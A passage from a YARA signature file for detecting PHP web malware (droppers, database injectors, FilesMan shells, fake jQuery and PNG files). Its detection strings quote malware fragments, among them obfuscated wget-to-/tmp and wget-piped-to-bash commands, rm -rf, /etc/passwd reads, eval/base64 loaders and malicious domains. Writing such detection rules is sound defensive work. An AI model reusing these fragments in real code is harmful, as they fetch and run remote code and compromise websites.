        $trigger = "WHERE 1=1 AND {$wpdb->users}.user_login !="
    condition:
        $trigger and PR04693 and PR04361 and PR04694
}

private rule PR04695 : trigger
{
    strings:
        $ps0 = "preg_replace(\"/(\\<body.*\\>)/\", \"$1\".$after_body, $output)"
    condition:
        $ps0
}

rule php_malware_db_injector_004 : malware
{
    strings:
        $trigger = "<ifram"
    condition:
        $trigger and PR00577 and PR04695 and PR00578
}

private rule PR04696 : trigger
{
    strings:
        $ps0 = "\"TABLE_NAME\"].\" set post_content = CONCAT(post_content,\\\"<script src="
    condition:
        $ps0
}

rule php_malware_db_injector_005 : malware
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR04696 and PR01431
}

private rule PR04697 : trigger
{
    strings:
        $ps0 = "$_SERVER['HTTP_USER_AGENT'];if($ua=='WP_API"
    condition:
        $ps0
}

private rule PR04698 : trigger
{
    strings:
        $ps0 = "SET `post_content`="
    condition:
        $ps0
}

rule php_malware_db_injector_006 : malware
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR04697 and PR00092 and PR04698 and PR01444
}

private rule PR04699 : trigger
{
    strings:
        $ps0 = "else{die(json_encode(array('status' => 'incomplete_data"
    condition:
        $ps0
}

rule php_malware_db_injector_006_02 : malware
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR04699 and PR00092 and PR04698 and PR01444
}

private rule PR04700 : trigger
{
    strings:
        $ps0 = "(strpos(strtolower($_SERVER['HTTP_USER_AGENT'])"
    condition:
        $ps0
}

private rule PR04701 : trigger
{
    strings:
        $ps0 = "(isset($_POST['h'], $_POST['u'], $_POST['p'], $_POST['n'])) {"
    condition:
        $ps0
}

rule php_malware_db_injector_007 : malware
{
    strings:
        $trigger = "str_replace("
    condition:
        $trigger and PR04700 and PR04701 and PR00092
}

private rule PR04702 : trigger
{
    strings:
        $ps0 = "$permalink = get_permalink($_POST['id"
    condition:
        $ps0
}

private rule PR04703 : trigger
{
    strings:
        $ps0 = "case 'get_post_content':"
    condition:
        $ps0
}

rule php_malware_db_injector_008 : malware
{
    strings:
        $trigger = "unlink(__DIR__"
    condition:
        $trigger and PR04702 and PR04703 and PR01746 and PR01490
}

private rule PR04704 : trigger
{
    strings:
        $ps0 = "post_stats('cr','OK',$tg,$injected,$nfo);"
    condition:
        $ps0
}

rule php_malware_db_injector_009 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01428 and PR04704 and PR01021
}

private rule PR04705 : trigger
{
    strings:
        $ps0 = "->query('update core_config_data set value = \"'.$s.'\" where config_id ="
    condition:
        $ps0
}

private rule PR04706 : trigger
{
    strings:
        $ps0 = "J2UnKydwJysnYScrJ3I"
    condition:
        $ps0
}

rule php_malware_db_injector_010 : malware
{
    strings:
        $trigger = "PHNjcmlwdD"
    condition:
        $trigger and PR04705 and PR01479 and PR04706
}

rule php_malware_doc_redirector_001 : malware
{
    strings:
        $trigger = ".docm');"
    condition:
        $trigger and PR02764
}

private rule PR04707 : trigger
{
    strings:
        $ps0 = "if(isset($_POST[\"hash\"]) and @md5($_POST[\"hash\"]) == \""
    condition:
        $ps0
}

private rule PR04708 : trigger
{
    strings:
        $ps0 = "\"+/=\""
    condition:
        $ps0
}

rule php_malware_dropper_001 : malware
{
    strings:
        $trigger = "= base64_decode(strtr($_POST[\""
    condition:
        $trigger and PR04707 and PR04708
}

private rule PR04709 : trigger
{
    strings:
        $ps0 = "(!empty($_POST[\"login\"])) {"
    condition:
        $ps0
}

rule php_malware_dropper_001_02 : malware
{
    strings:
        $trigger = "$vars = \"url=\".$_SERVER[\"HTTP_REFERER\"].\"&login=\".$_POST[\"login\"][\"username\""
    condition:
        $trigger and PR04709 and PR01401
}

rule php_malware_dropper_003 : malware
{
    strings:
        $trigger = "@file_exists($n.\".bin\")"
    condition:
        $trigger
}

private rule PR04710 : trigger
{
    strings:
        $ps0 = "KTtAc2V0X3RpbWVfbGltaXQoMTUwKTtAaWdub3JlX3VzZXJfYWJvcnQodHJ1ZSk7QGluaV9zZXQoJ21heF9leGVjdXRpb25fdGltZScsMTUwKTtpZigkX1NFUlZFUlsnUkVRVUVTVF9NRVRIT0QnXT09"
    condition:
        $ps0
}

rule php_malware_dropper_004 : malware
{
    strings:
        $trigger = "REQUEST"
    condition:
        $trigger and PR00029 and PR04710
}

private rule PR04711 : trigger
{
    strings:
        $ps0 = "$data = base64_decode(\""
    condition:
        $ps0
}

private rule PR04712 : trigger
{
    strings:
        $ps0 = ".zip\",$data);"
    condition:
        $ps0
}

rule php_malware_dropper_004_02 : malware
{
    strings:
        $trigger = "class PclZip"
    condition:
        $trigger and PR00435 and PR04711 and PR04712 and PR04242
}

private rule PR04713 : trigger
{
    strings:
        $ps0 = "if (isset($_GET['s'])) { die"
    condition:
        $ps0
}

private rule PR04714 : trigger
{
    strings:
        $ps0 = ": attachment; filename=\"'"
    condition:
        $ps0
}

rule php_malware_dropper_005 : malware
{
    strings:
        $trigger = "die(base64_decode($this->content"
    condition:
        $trigger and PR00732 and PR04713 and PR04714
}

private rule PR04715 : trigger
{
    strings:
        $ps0 = "shell-path:"
    condition:
        $ps0
}

rule php_malware_dropper_006 : malware
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR04715 and PR01479
}

private rule PR04716 : trigger
{
    strings:
        $ps0 = "fnd(getcwd());if("
    condition:
        $ps0
}

private rule PR04717 : trigger
{
    strings:
        $ps0 = ";}include("
    condition:
        $ps0
}

rule php_malware_dropper_007 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR04716 and PR04717 and PR00357
}

private rule PR04718 : trigger
{
    strings:
        $ps0 = "file_get_contents("
    condition:
        $ps0
}

rule php_malware_dropper_008 : malware
{
    strings:
        $trigger = "\\x72\\x65\\x70\\x6C\\x61\\x63\\x65\",\"\\x6C\\x6F\\x63\\x61\\x74\\x69\\x6F\\x6E\"];window"
    condition:
        $trigger and PR03964 and PR04718
}

private rule PR04719 : trigger
{
    strings:
        $ps0 = "&name=r0ot.pl"
    condition:
        $ps0
}

rule php_malware_dropper_009 : malware
{
    strings:
        $trigger = "pass"
    condition:
        $trigger and PR04719 and PR01479
}

rule php_malware_dropper_010 : malware
{
    strings:
        $trigger = "shell_exec(\"chmod 777 -R ."
    condition:
        $trigger
}

rule php_malware_dropper_010_02 : malware
{
    strings:
        $trigger = "recaptcha-in.pw"
    condition:
        $trigger and PR00050
}

rule php_malware_dropper_010_03 : malware
{
    strings:
        $trigger = "google-statik.pw"
    condition:
        $trigger and PR00050
}

private rule PR04720 : trigger
{
    strings:
        $ps0 = "curl_setopt ( $wp_"
    condition:
        $ps0
}

rule php_malware_dropper_011 : malware
{
    strings:
        $trigger = "file_put_contents ( ABSPATH . WPINC"
    condition:
        $trigger and PR04720
}

private rule PR04721 : trigger
{
    strings:
        $ps0 = "file_put_contents ( ABSPATH . WPINC ."
    condition:
        $ps0
}

rule php_malware_dropper_011_02 : malware
{
    strings:
        $trigger = "if ( is_dir ( ABSPATH . WPINC )"
    condition:
        $trigger and PR04721 and PR04720
}

rule php_malware_dropper_012 : malware
{
    strings:
        $trigger = "explode(PHP_EOL,file_get_contents(__DIR__.'/s')"
    condition:
        $trigger and PR00435
}

rule php_malware_dropper_013 : malware
{
    strings:
        $trigger = "eval(base64_decode(\"JHBheWxvYWRfZmlsZSA9"
    condition:
        $trigger
}

rule php_malware_dropper_014 : malware
{
    strings:
        $trigger = "echo file_put_contents(\"../../index.php\","
    condition:
        $trigger and PR00341
}

rule php_malware_dropper_015 : malware
{
    strings:
        $trigger = "&& file_put_contents($file, $data)) {"
    condition:
        $trigger and PR01529
}

private rule PR04722 : trigger
{
    strings:
        $ps0 = "\\x6f\\x63\\x3b\\x72\\x6d\\x20-rf /\\x74m\\x70/\\x64\\x6fc"
    condition:
        $ps0
}

rule php_malware_dropper_017 : malware
{
    strings:
        $trigger = "exec"
    condition:
        $trigger and PR04722 and PR00013
}

private rule PR04723 : trigger
{
    strings:
        $ps0 = "unlink ($path)"
    condition:
        $ps0
}

rule php_malware_dropper_018 : malware
{
    strings:
        $trigger = "file_put_contents($path,file_get_contents("
    condition:
        $trigger and PR04723 and PR01021
}

private rule PR04724 : trigger
{
    strings:
        $ps0 = ",\"w+\");"
    condition:
        $ps0
}

private rule PR04725 : trigger
{
    strings:
        $ps0 = "$tulis"
    condition:
        $ps0
}

rule php_malware_dropper_019 : malware
{
    strings:
        $trigger = "fopen"
    condition:
        $trigger and PR04724 and PR00355 and PR04725 and PR03061 and PR04331
}

private rule PR04726 : trigger
{
    strings:
        $ps0 = "\"./wp-admin/css/colors/"
    condition:
        $ps0
}

private rule PR04727 : trigger
{
    strings:
        $ps0 = "\"./wp-links-opml.php\","
    condition:
        $ps0
}

rule php_malware_dropper_020 : malware
{
    strings:
        $trigger = "function get_array("
    condition:
        $trigger and PR01436 and PR04726 and PR00029 and PR04727
}

private rule PR04728 : trigger
{
    strings:
        $ps0 = "\\x77get\\x20-O /t\\x6d\\x70/doc\\x20ht\\x74p"
    condition:
        $ps0
}

rule php_malware_dropper_021 : malware
{
    strings:
        $trigger = "exec"
    condition:
        $trigger and PR00013 and PR04728
}

rule php_malware_dropper_022 : malware
{
    strings:
        $trigger = "file_put_contents('../../../wp-admin/wp-store-class.php',$request['body']"
    condition:
        $trigger
}

private rule PR04729 : trigger
{
    strings:
        $ps0 = "w\\x67et\\x20-\\x4f\\x20/tmp/\\x64\\x6fc htt\\x70:"
    condition:
        $ps0
}

rule php_malware_dropper_023 : malware
{
    strings:
        $trigger = "exec"
    condition:
        $trigger and PR00013 and PR04729
}

rule php_malware_dropper_024 : malware
{
    strings:
        $trigger = "shell_exec(\"wget -O /tmp/shell"
    condition:
        $trigger
}

rule php_malware_dropper_025 : malware
{
    strings:
        $trigger = "shell_exec(\"wget -c"
    condition:
        $trigger
}

rule php_malware_dropper_026 : malware
{
    strings:
        $trigger = "@eval(gzinflate(base64_decode('FJ23ctzYFkV/ZYKpmgABvAteAO9do2Eze"
    condition:
        $trigger
}

private rule PR04730 : trigger
{
    strings:
        $ps0 = "echo `curl -k $(echo {$GLOBALS['URL']}"
    condition:
        $ps0
}

rule php_malware_dropper_027 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR04730 and PR00355 and PR00357
}

rule php_malware_dropper_028 : malware
{
    strings:
        $trigger = "PD9waHANCmVjaG8gIlRoaXMgc2hpdCB3b3JrcyE"
    condition:
        $trigger and PR00435
}

private rule PR04731 : trigger
{
    strings:
        $ps0 = "popen(\"wget -q -O - http"
    condition:
        $ps0
}

private rule PR04732 : trigger
{
    strings:
        $ps0 = "| bash -sh\",\"r\");"
    condition:
        $ps0
}

rule php_malware_dropper_029 : malware
{
    strings:
        $trigger = ">"
    condition:
        $trigger and PR04731 and PR04732
}

private rule PR04733 : trigger
{
    strings:
        $ps0 = "function ing($string, $key)"
    condition:
        $ps0
}

rule php_malware_dropper_030 : malware
{
    strings:
        $trigger = "chr(hexdec($func_string"
    condition:
        $trigger and PR04733 and PR01480
}

private rule PR04734 : trigger
{
    strings:
        $ps0 = "AddHandler cgi-script .izo"
    condition:
        $ps0
}

rule php_malware_dropper_031 : malware
{
    strings:
        $trigger = "unlink(\"pyth/she.izo\");"
    condition:
        $trigger and PR00039 and PR02056 and PR04734
}

private rule PR04735 : trigger
{
    strings:
        $ps0 = "gzinflate(urldecode($content))"
    condition:
        $ps0
}

private rule PR04736 : trigger
{
    strings:
        $ps0 = "preg_match_all(':>([^<]+)<:iUs', php_strip_whitespace(__FILE__), $matches) and isset($matches[1][1]))"
    condition:
        $ps0
}

rule php_malware_dropper_032 : malware
{
    strings:
        $trigger = "preg_replace"
    condition:
        $trigger and PR04735 and PR04736
}

private rule PR04737 : trigger
{
    strings:
        $ps0 = "function strings($text, $key){for($i=0;$i<strlen($text);"
    condition:
        $ps0
}

rule php_malware_dropper_033 : malware
{
    strings:
        $trigger = "$tmpfile = tempnam(sys_get_temp_dir(),'');"
    condition:
        $trigger and PR00435 and PR04737
}

private rule PR04738 : trigger
{
    strings:
        $ps0 = ".php.suspected\")) rename ("
    condition:
        $ps0
}

rule php_malware_dropper_034 : malware
{
    strings:
        $trigger = "fwrite($htout, \"RewriteEngine On"
    condition:
        $trigger and PR00203 and PR04738 and PR00205
}

private rule PR04739 : trigger
{
    strings:
        $ps0 = "> 64) || die("
    condition:
        $ps0
}

rule php_malware_dropper_035 : malware
{
    strings:
        $trigger = "@system(\"killall -9 \".$"
    condition:
        $trigger and PR00435 and PR04739
}

private rule PR04740 : trigger
{
    strings:
        $ps0 = "echo \":::NO REPLY CHK:::$file_path:::\\r\\n\";"
    condition:
        $ps0
}

rule php_malware_dropper_036 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR04740 and PR01468 and PR01469
}

private rule PR04741 : trigger
{
    strings:
        $ps0 = ";rm -rf ."
    condition:
        $ps0
}

rule php_malware_dropper_037 : malware
{
    strings:
        $trigger = "$output = shell_exec('perl"
    condition:
        $trigger and PR04741 and PR01021
}

private rule PR04742 : trigger
{
    strings:
        $ps0 = "$zipFiles = glob($currentPath . DIRECTORY_SEPARATOR . $path . DIRECTORY_SEPARATOR . '*.zip');"
    condition:
        $ps0
}

private rule PR04743 : trigger
{
    strings:
        $ps0 = "if (base64_encode($paths[0])"
    condition:
        $ps0
}

rule php_malware_dropper_038 : malware
{
    strings:
        $trigger = "error_reporting"
    condition:
        $trigger and PR04742 and PR00265 and PR04743
}

private rule PR04744 : trigger
{
    strings:
        $ps0 = "php',base64_decode('PD"
    condition:
        $ps0
}

rule php_malware_dropper_039 : malware
{
    strings:
        $trigger = "<?php file_put_contents($_SERVER['DOCUMENT_ROOT']."
    condition:
        $trigger and PR04744
}

private rule PR04745 : trigger
{
    strings:
        $ps0 = "substr(str_shuffle($"
    condition:
        $ps0
}

rule php_malware_dropper_040 : malware
{
    strings:
        $trigger = "mkdir(\"$path/$drname\", 0777);"
    condition:
        $trigger and PR00435 and PR04745 and PR04712
}

private rule PR04746 : trigger
{
    strings:
        $ps0 = "file_get_contents('/etc/passwd"
    condition:
        $ps0
}

private rule PR04747 : trigger
{
    strings:
        $ps0 = "proc_open($"
    condition:
        $ps0
}

rule php_malware_dropper_041 : malware
{
    strings:
        $trigger = "echo system('gcc"
    condition:
        $trigger and PR00355 and PR04746 and PR04747 and PR00357
}

rule php_malware_dropper_042 : malware
{
    strings:
        $trigger = "ignore_user_abort(1);while(1){file_put_contents($_SERVER['DOCUMENT_ROOT']."
    condition:
        $trigger and PR04744
}

private rule PR04748 : trigger
{
    strings:
        $ps0 = "eval (\"?>\"."
    condition:
        $ps0
}

rule php_malware_dropper_043 : malware
{
    strings:
        $trigger = "base64_decode($"
    condition:
        $trigger and PR04748 and PR01431
}

private rule PR04749 : trigger
{
    strings:
        $ps0 = "echo gzuncompress(base64_decode("
    condition:
        $ps0
}

rule php_malware_dropper_044 : malware
{
    strings:
        $trigger = "Content-Disposition: attachment; filename"
    condition:
        $trigger and PR04749 and PR00029
}

private rule PR04750 : trigger
{
    strings:
        $ps0 = "$stat = json_decode(fread($fp, $fileSize), true);"
    condition:
        $ps0
}

rule php_malware_dropper_045 : malware
{
    strings:
        $trigger = "return gzinflate(base64_decode($contentData));"
    condition:
        $trigger and PR00029 and PR04750
}

private rule PR04751 : trigger
{
    strings:
        $ps0 = "die('No wp-conf');"
    condition:
        $ps0
}

rule php_malware_dropper_046 : malware
{
    strings:
        $trigger = "PD9waHAKLyoqCiAqIEBwYWNrYWd"
    condition:
        $trigger and PR01398 and PR04751
}

private rule PR04752 : trigger
{
    strings:
        $ps0 = "if (stripos($userAgent, $this->"
    condition:
        $ps0
}

rule php_malware_dropper_047 : malware
{
    strings:
        $trigger = "gzinflate(base64_decode($"
    condition:
        $trigger and PR04752 and PR01403 and PR01415
}

private rule PR04753 : trigger
{
    strings:
        $ps0 = "file_put_contents($file, $code);"
    condition:
        $ps0
}

private rule PR04754 : trigger
{
    strings:
        $ps0 = "if (file_exists($file1) && md5(file_get_contents($file1)) == md5($code_self)) {"
    condition:
        $ps0
}

rule php_malware_dropper_048 : malware
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR04753 and PR04754
}

rule php_malware_dropper_049 : malware
{
    strings:
        $trigger = "@unlink(\"{$p}media/.htaccess\");"
    condition:
        $trigger and PR00435
}

rule php_malware_dropper_050 : malware
{
    strings:
        $trigger = "$write = fwrite($file, base64_decode($zip1)); fclose($file); } function zip"
    condition:
        $trigger
}

private rule PR04755 : trigger
{
    strings:
        $ps0 = "fopen(\"http://$config"
    condition:
        $ps0
}

rule php_malware_dropper_051 : malware
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR04755 and PR01362
}

rule php_malware_dropper_052 : malware
{
    strings:
        $trigger = "file_put_contents('../../' . $cpl_name, base64_decode($cpl));"
    condition:
        $trigger
}

private rule PR04756 : trigger
{
    strings:
        $ps0 = "header('Content-Transfer"
    condition:
        $ps0
}

private rule PR04757 : trigger
{
    strings:
        $ps0 = "(empty($_SESSION['file_ext']))"
    condition:
        $ps0
}

rule php_malware_dropper_053 : malware
{
    strings:
        $trigger = "base64_decode($"
    condition:
        $trigger and PR04756 and PR01480 and PR04757 and PR04526 and PR00348 and PR01607
}

rule php_malware_dropper_054 : malware
{
    strings:
        $trigger = "s.ttc';"
    condition:
        $trigger and PR00435
}

private rule PR04758 : trigger
{
    strings:
        $ps0 = "!^(.{0,150})\\s.*!su',"
    condition:
        $ps0
}

rule php_malware_dropper_055 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01780 and PR01468 and PR04758
}

private rule PR04759 : trigger
{
    strings:
        $ps0 = "drupal_bootstrap(DRUPAL_BOOTSTRAP_FULL);$element=array(\"#tag"
    condition:
        $ps0
}

private rule PR04760 : trigger
{
    strings:
        $ps0 = "equire_on"
    condition:
        $ps0
}

rule php_malware_drupal_injection_001 : malware
{
    strings:
        $trigger = "</script>\",);drupal_add_html_head($element"
    condition:
        $trigger and PR04759 and PR04760
}

private rule PR04761 : trigger
{
    strings:
        $ps0 = " = stripDangerousValues($_"
    condition:
        $ps0
}

rule php_malware_drupalgeddon3_001 : malware
{
    strings:
        $trigger = "($_POST)"
    condition:
        $trigger and PR04761
}

private rule PR04762 : trigger
{
    strings:
        $ps0 = "$enced=base64_decode($enced);"
    condition:
        $ps0
}

rule php_malware_enced_001 : malware
{
    strings:
        $trigger = "CURL"
    condition:
        $trigger and PR04762
}

private rule PR04763 : trigger
{
    strings:
        $ps0 = "return $crypted_css;"
    condition:
        $ps0
}

rule php_malware_encoded_css_001 : malware
{
    strings:
        $trigger = "function xTextEncode($"
    condition:
        $trigger and PR01179 and PR04763
}

rule php_malware_eval_gen_008 : malware
{
    strings:
        $trigger = "eval($_POST["
    condition:
        $trigger and PR03408
}

private rule PR04764 : trigger
{
    strings:
        $ps0 = "mCHU1bPtg9vXACQX5P5a"
    condition:
        $ps0
}

rule php_malware_eval_gen_009 : malware
{
    strings:
        $trigger = "str_replace"
    condition:
        $trigger and PR04764
}

rule php_malware_eval_gen_010 : malware
{
    strings:
        $trigger = "Black_Phish Encoder"
    condition:
        $trigger and PR02609
}

rule php_malware_exif_read_001 : malware
{
    strings:
        $trigger = "preg_replace($exif['Make']"
    condition:
        $trigger
}

rule php_malware_exif_read_001_03 : malware
{
    strings:
        $trigger = "@preg_replace($exif"
    condition:
        $trigger
}

rule php_malware_extract_002 : malware
{
    strings:
        $trigger = "extract($_REQUEST) && @"
    condition:
        $trigger
}

rule php_malware_extract_003 : malware
{
    strings:
        $trigger = "])) { @extract($_REQUEST); $"
    condition:
        $trigger and PR01379
}

private rule PR04765 : trigger
{
    strings:
        $ps0 = "echo copy('http://seo-moz.com/"
    condition:
        $ps0
}

rule php_malware_fakeseomoz_001 : malware
{
    strings:
        $trigger = "eval(base64_decode('aWY"
    condition:
        $trigger and PR04765
}

private rule PR04766 : trigger
{
    strings:
        $ps0 = "get_remote_file(\"\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x61\\x70\\x69\\x2e\\x73\\x65\\x6f\\x2d\\x6d\\x6f\\x7a\\x2e"
    condition:
        $ps0
}

rule php_malware_fakeseomoz_002 : malware
{
    strings:
        $trigger = "fsockopen"
    condition:
        $trigger and PR04766
}

// MANUAL FIX NECESSARY
private rule PR04767 : trigger
{
    strings:
        $ps0 = "j..q..e..u..r..y...o..r..g"
    condition:
        $ps0
}

private rule PR04768 : trigger
{
    strings:
        $ps0 = "u..p..d..a..t..e"
    condition:
        $ps0
}

rule php_malware_fake_jquery_001 : malware
{
    strings:
        $trigger = "require_once"
        $php_malware_fake_jquery_001_r0 = /if \(!function_exists\(.[\w]+.\)\)[\s]*\{[\s]*function glues_it/
    condition:
        $trigger and PR04767 and PR04768 and $php_malware_fake_jquery_001_r0
}

private rule PR04769 : trigger
{
    strings:
        $ps0 = "h..t..t..p..:../../..j..q..e..u..r..y...o..r..g.."
    condition:
        $ps0
}

rule php_malware_fake_jquery_001_02 : malware
{
    strings:
        $trigger = "require_once"
    condition:
        $trigger and PR04769
}

rule php_malware_fake_socialshare_001 : malware
{
    strings:
        $trigger = "wp-content/mu-plugins/mu-plugin.png"
    condition:
        $trigger and PR02092
}

private rule PR04770 : trigger
{
    strings:
        $ps0 = "if (!file_put_contents(ABSPATH.'wp-about-4.2.php'"
    condition:
        $ps0
}

rule php_malware_fake_wp_about_001 : malware
{
    strings:
        $trigger = "add_action("
    condition:
        $trigger and PR04770
}

// MANUAL FIX NECESSARY
private rule PR04771 : trigger
{
    strings:
        $ps0 = "IHDR"
    condition:
        $ps0
}

private rule PR04772 : trigger
{
    strings:
        $ps0 = "<?php"
    condition:
        $ps0
}

private rule PR04773 : trigger
{
    strings:
        $ps0 = "PNG"
    condition:
        $ps0
}

rule php_malware_fakePNG_001 : malware
{
    strings:
        $trigger = ">"
        $php_malware_fakePNG_001_r0 = /PNG\x0a\x1a\x0a/
    condition:
        $trigger and PR04771 and PR04772 and PR04773 and $php_malware_fakePNG_001_r0
}

rule php_malware_fakeupdate_001 : malware
{
    strings:
        $trigger = "%41%64%6f%62%65%20%46%6c%61%73%68%20%50%6c%61%79%65%72"
    condition:
        $trigger and PR00231
}

private rule PR04774 : trigger
{
    strings:
        $ps0 = "if (is_writable($pth.\"wp-content/plugins\")) { $wpdir ="
    condition:
        $ps0
}

private rule PR04775 : trigger
{
    strings:
        $ps0 = "copy(\"favicon.ico\",$wpdir.\"/favicon.ico\");"
    condition:
        $ps0
}

rule php_malware_favicon_001 : malware
{
    strings:
        $trigger = "mkdir($wpdir,0777,true);"
    condition:
        $trigger and PR00435 and PR04774 and PR04775
}

rule php_malware_file_exists_001 : malware
{
    strings:
        $trigger = ")){echo(file_get_contents"
    condition:
        $trigger
}

private rule PR04776 : trigger
{
    strings:
        $ps0 = "= @fopen($"
    condition:
        $ps0
}

private rule PR04777 : trigger
{
    strings:
        $ps0 = "usleep("
    condition:
        $ps0
}

rule php_malware_file_exists_002 : malware
{
    strings:
        $trigger = "exit();"
    condition:
        $trigger and PR04776 and PR01952 and PR04777
}

private rule PR04778 : trigger
{
    strings:
        $ps0 = "array_push($good, $site.':'.macroses($site, $login).':'.macroses($site, $passwords[$rst]));"
    condition:
        $ps0
}

rule php_malware_file_exists_003 : malware
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR04778 and PR01431
}

private rule PR04779 : trigger
{
    strings:
        $ps0 = "function get_file($path)"
    condition:
        $ps0
}

private rule PR04780 : trigger
{
    strings:
        $ps0 = "if ( ! $path || ! @is_file($path) )"
    condition:
        $ps0
}

private rule PR04781 : trigger
{
    strings:
        $ps0 = "echo $basepath;"
    condition:
        $ps0
}

rule php_malware_file_exists_004 : malware
{
    strings:
        $trigger = "return @file_get_contents($path);"
    condition:
        $trigger and PR04779 and PR04780 and PR04781
}

private rule PR04782 : trigger
{
    strings:
        $ps0 = "create_function(\"\",@gzuncompress($__));$_();"
    condition:
        $ps0
}

rule php_malware_filesman_030 : malware
{
    strings:
        $trigger = "pass"
    condition:
        $trigger and PR04782 and PR01479
}

rule php_malware_filesman_031 : malware
{
    strings:
        $trigger = "zb1rj+rKkjb4V161+sPbWtJs20CtQj3"
    condition:
        $trigger and PR00029
}

private rule PR04783 : trigger
{
    strings:
        $ps0 = "\\x27\\x37\\130\\x31\\x72\\145\\71\\x72\\x47\\x45\\x76\\104\\x6e\\x6e\\x4f"
    condition:
        $ps0
}

rule php_malware_filesman_033 : malware
{
    strings:
        $trigger = "goto"
    condition:
        $trigger and PR04783
}

private rule PR04784 : trigger
{
    strings:
        $ps0 = "=$_SERVER[base64_decode('U0VSVkVSX05BTUU=')];if($_SERVER"
    condition:
        $ps0
}

private rule PR04785 : trigger
{
    strings:
        $ps0 = "dirname(__FILE__)),array('')));if(count("
    condition:
        $ps0
}

rule php_malware_filesman_034 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01468 and PR04784 and PR04785
}

private rule PR04786 : trigger
{
    strings:
        $ps0 = "goto"
    condition:
        $ps0
}

rule php_malware_filesman_035 : malware
{
    strings:
        $trigger = "\\x6b\\137\\51\\64\\63\\x70\\166\\x69\\163\\x6f\\161\\x68\\x6d\\x77\\x79"
    condition:
        $trigger and PR04786
}

private rule PR04787 : trigger
{
    strings:
        $ps0 = "json_encode(array_combine($_POST[$lng_tpl"
    condition:
        $ps0
}

private rule PR04788 : trigger
{
    strings:
        $ps0 = "if (!isset($_COOKIE["
    condition:
        $ps0
}

rule php_malware_filesman_036 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR04787 and PR04788 and PR00357
}

rule php_malware_filesman_037 : malware
{
    strings:
        $trigger = "ZXZhbCUyOCUyNnF1b3QlM0I"
    condition:
        $trigger and PR00029 and PR01436
}

private rule PR04789 : trigger
{
    strings:
        $ps0 = "BcHbkoIgAADQd"
    condition:
        $ps0
}

rule php_malware_filesman_038 : malware
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR00029 and PR04789
}

rule php_malware_filesman_039 : malware
{
    strings:
        $trigger = "Ly8NCiTilpsgPSAiMTg4MTYycjkwbzg4MjcxMDMw"
    condition:
        $trigger and PR00265 and PR01720
}

private rule PR04790 : trigger
{
    strings:
        $ps0 = "9P64d0CtFu83e23YMyMkMnNSlTEcduG9Ef2xmmLyL"
    condition:
        $ps0
}

rule php_malware_filesman_040 : malware
{
    strings:
        $trigger = "urldecode("
    condition:
        $trigger and PR00029 and PR04790
}

private rule PR04791 : trigger
{
    strings:
        $ps0 = "GyhzisXB0C0KuGK3Uul9RvjyIFtv0Vq"
    condition:
        $ps0
}

rule php_malware_filesman_041 : malware
{
    strings:
        $trigger = "urldecode("
    condition:
        $trigger and PR00029 and PR04791
}

private rule PR04792 : trigger
{
    strings:
        $ps0 = "_('$_',$__"
    condition:
        $ps0
}

private rule PR04793 : trigger
{
    strings:
        $ps0 = "_();echo $_"
    condition:
        $ps0
}

rule php_malware_filesman_042 : malware
{
    strings:
        $trigger = ".chr"
    condition:
        $trigger and PR04792 and PR04793
}

rule php_malware_filesman_042_02 : malware
{
    strings:
        $trigger = ".chr"
    condition:
        $trigger and PR04792 and PR01392
}

private rule PR04794 : trigger
{
    strings:
        $ps0 = "eval%28eval%28eval%28eval%28eval%28eval%28eval"
    condition:
        $ps0
}

private rule PR04795 : trigger
{
    strings:
        $ps0 = "return%20strrev%28gzinflate%28"
    condition:
        $ps0
}

rule php_malware_filesman_043 : malware
{
    strings:
        $trigger = "urldecode("
    condition:
        $trigger and PR04794 and PR04795
}

rule php_malware_FOPO_001 : malware
{
    strings:
        $trigger = "=\"\\x62\\141\\x73\\145\\x36\\64\\x5f\\144\\x65\\143\\x6f\\144\\x65\";@eval($"
    condition:
        $trigger and PR02287
}

// MANUAL FIX NECESSARY
rule php_malware_fopo_obfuscator_001 : malware
{
    strings:
        $trigger = "\";@eval($"
        $php_malware_fopo_obfuscator_001_r0 = /\"[\s]*Ly9/
    condition:
        $trigger and PR00634 and $php_malware_fopo_obfuscator_001_r0
}

private rule PR04796 : trigger
{
    strings:
        $ps0 = "=base64_decode('PHNjcmlwdCBzcmM9Imh0dHA6Ly9nMDAuY28vUD"
    condition:
        $ps0
}

rule php_malware_g00_001 : malware
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR04796
}

private rule PR04797 : trigger
{
    strings:
        $ps0 = "gd-lib.php"
    condition:
        $ps0
}

rule php_malware_gdlib_001 : malware
{
    strings:
        $trigger = "require_once"
    condition:
        $trigger and PR04797
}

private rule PR04798 : trigger
{
    strings:
        $ps0 = "gd-system-plugin.php"
    condition:
        $ps0
}

rule php_malware_gdlib_002 : malware
{
    strings:
        $trigger = "require_once"
    condition:
        $trigger and PR04798
}

rule php_malware_genericgzinflatepreg_match_002 : malware
{
    strings:
        $trigger = ">h9b8himkm8moojn>kbi?!*(3,;.?z)"
    condition:
        $trigger and PR00029
}

private rule PR04799 : trigger
{
    strings:
        $ps0 = "eval(gzinflate(Str_Rot13(base64_decod"
    condition:
        $ps0
}

rule php_malware_genericStr_Rot13_001 : malware
{
    strings:
        $trigger = "(base64_decode("
    condition:
        $trigger and PR04799
}

rule php_malware_generic_001 : malware
{
    strings:
        $trigger = "echo(stripslashes(base64_decode('P"
    condition:
        $trigger
}

rule php_malware_generic_002 : malware
{
    strings:
        $trigger = "eval(\"?>\".base64_decode(\""
    condition:
        $trigger
}

rule php_malware_generic_003 : malware
{
    strings:
        $trigger = "eval(gzinflate(base64_decode('tV"
    condition:
        $trigger
}

rule php_malware_generic_004 : malware
{
    strings:
